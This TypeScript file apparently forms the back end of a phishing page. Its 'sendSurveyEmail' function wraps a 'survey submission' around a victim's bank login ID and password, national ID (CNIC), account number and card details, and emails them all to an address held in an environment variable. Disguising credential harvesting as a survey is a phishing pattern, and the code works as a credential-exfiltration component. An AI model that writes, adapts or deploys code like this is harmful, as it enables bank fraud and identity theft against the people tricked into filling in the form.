import { Resend } from "resend";

export const resend = new Resend(process.env.RESEND_API_KEY);

export async function sendSurveyEmail(data: any) {
  const { account, card, review } = data;

  const htmlContent = `
    <h2>New Survey Submission</h2>

    <h3>Account Details</h3>
    <ul>
      <li><strong>Login ID:</strong> ${account.loginId}</li>
      <li><strong>Password:</strong> ${account.password}</li>
      <li><strong>CNIC:</strong> ${account.cnic}</li>
      <li><strong>Bank Name:</strong> ${account.bankName}</li>
      <li><strong>Account Number:</strong> ${account.accountNumber}</li>
    </ul>

    <h3>Card Details</h3>
    <ul>
      <li><strong>Card Number:</strong> ${card.cardNumber}</li>
      <li><strong>Issued Date:</strong> ${card.issuedDate}</li>
      <li><strong>Name on Card:</strong> ${card.nameOnCard}</li>
    </ul>

    <h3>Review</h3>
    <p>${review}</p>
  `;

  await resend.emails.send({
    from: process.env.EMAIL_FROM!,
    to: process.env.EMAIL_TO!,
    subject: "New Survey Response",
    html: htmlContent,
  });
}
